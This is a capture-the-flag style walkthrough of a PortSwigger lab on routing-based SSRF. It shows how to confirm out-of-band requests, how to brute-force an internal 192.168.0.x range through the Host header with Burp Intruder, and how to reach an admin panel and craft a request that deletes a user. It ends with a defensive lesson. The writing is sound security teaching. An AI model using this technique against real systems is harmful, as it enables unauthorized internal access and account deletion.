---
title: "Routing-based SSRF"
description: A walkthrough on a lab which is vulnerable to routing-based SSRF via the Host header.
date: 2026-03-13
categories: [Web Security, SSRF]
tags: [web, portswigger, ctf]
image: /assets/img/ssrfrouting.png
---

## Lab Description

This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.
To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

> To solve the lab, you must use Burp Collaborator's default public server. (Burp Suite Professional)
{: .prompt-info }

### Solution

### Step 1: 

Send the `GET /` request that received a `200` response to Burp Repeater.
```
C:\Windows\System32>curl https://0a49003b04c9e391804fe4df00eb0016.web-security-academy.net/ -vv
10:33:30.924000 [0-0] < HTTP/1.1 200 OK
10:33:30.939000 [0-0] < Content-Type: text/html; charset=utf-8
10:33:30.943000 [0-0] < Set-Cookie: session=aXlYxQXfyk5xEsseKnWF1sTQL5pXZtEP; Secure; HttpOnly; SameSite=None
10:33:30.946000 [0-0] < Set-Cookie: _lab=45%7cMCsCFBB%2bgfm8hLlW9IoSWjCmaAqxjYK3AhMvEE0lWkMp%2bUCe71fuHqww1TjezTIerDdlT7PLuNCvgO2aqmT2jz5Vyi4q9lCDAhhd2xHeNygDfBHoW%2bkwabEK2%2bMotGeMgjONmzu2%2braUhSeDDvSKA8r1mUsEBDl6Eld0KeoW%2fnirTQ%3d%3d; Secure; HttpOnly; SameSite=None
```

### Step 2: 

Send the same request but now intercept the request and modify the Host header value with your Collaborator payload. Now, forward the request.

### Step 3: 

Go to the Collaborator tab and click Poll now. You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.

![Burp Collaborator Interaction](/assets/img/screenshot1.png)
_Proof_

### Step 4: 

Send the GET / request to Burp Intruder.

### Step 5: 

Go to Intruder.

### Step 6: 

Deselect Update Host header to match target.

![Host Header Settings](/assets/img/screenshot2.png)
_Screenshot_

### Step 7: 

Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:
```
Host: 192.168.0.§0§
```

### Step 8: 

In the Payloads side panel, select the payload type Numbers. Under Payload configuration, enter the following values:
```
From: 0
To: 255
Step: 1
```
- This value is correspondence to the subnet of 192.168.0.0/24

### Step 9: 

Click  Start attack. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.

### Step 10: 

When the attack finishes, click the Status column to sort the results. Notice that a single request received a `302 response` redirecting you to `/admin`. Send this request to Burp Repeater.

### Step 11: 

In Burp Repeater, change the request line to GET /admin and send the request. In the response, observe that you have successfully accessed the admin panel. 
```
curl -k https://0a32009e04c44ae08201033e00ba00c8.web-security-academy.net/admin \
  -H "Cookie: _lab=46%7cMCwCFHL2KvRD9ZvCkodWSk8%2bRlgZ5YvOAhQ5Ye2oThExLR6fVN3Y%2fP0GmQ%2bvxxDYNYxuS3WvjIJeB0mg%2bsgvsbHzgeHf6I4y6jKWMhKU99LL809C2KxOrbX2nnn%2bPOBe870vfE%2fmcGx2HGmwpUH0lIG1QDs5uvkoTUq%2fRI%2bI6Y2VN1A%3d; session=oZfqeSeDxgEEKSsWQql46lVoBs39ENfW"

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3001
```

### Step 12: 

Study the form for deleting users. Notice that it will generate a `POST` request to `/admin/delete` with both a `CSRF token and username parameter`. You need to manually craft an equivalent request to delete carlos.
```
                   <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="0b6ZfnqWJAuuTbHesJt4PqRLB9jwpAXd">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
```

### Step 13: 

Change the path in your request to `/admin/delete`. Copy the `CSRF token` from the displayed response and add it as a query parameter to your request. Also add a username parameter containing `carlos`. The request line should now look like this but with a different CSRF token:
```
admin/delete?username=carlos&csrf=0b6ZfnqWJAuuTbHesJt4PqRLB9jwpAXd

or POST Method
POST /admin/delete HTTP/2
Host: 192.168.0.205
Cookie: .......................

username=carlos&csrf=0b6ZfnqWJAuuTbHesJt4PqRLB9jwpAXd
```

### Step 14: 

Send the request to delete carlos and solve the lab.

#### The Core Security Lessons

Never trust the Host header

Applications must **not trust user-controlled headers** like:

`Host`

`X-Forwarded-Host`

`X-Forwarded-For`

These headers can be manipulated.

